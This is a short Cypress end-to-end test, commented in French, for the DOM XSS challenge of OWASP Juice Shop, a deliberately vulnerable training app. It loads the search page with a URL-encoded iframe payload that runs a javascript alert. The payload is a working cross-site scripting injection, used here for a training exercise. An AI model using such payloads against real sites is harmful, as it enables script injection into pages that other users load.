const baseUrl = Cypress.env("JUICESHOP_URL");

describe("Challenge - DOM XSS", () => {
  it("Empêcher les alertes bloquantes et capturer leur contenu", () => {
    // Définir le payload XSS
    const xssPayload = "%3Ciframe%20src=%22javascript:alert(%60xss%60)%22%3E";

    // Charger la page avec le payload XSS
    cy.visit(`${baseUrl}/#/search?q=${xssPayload}`);
  });
});
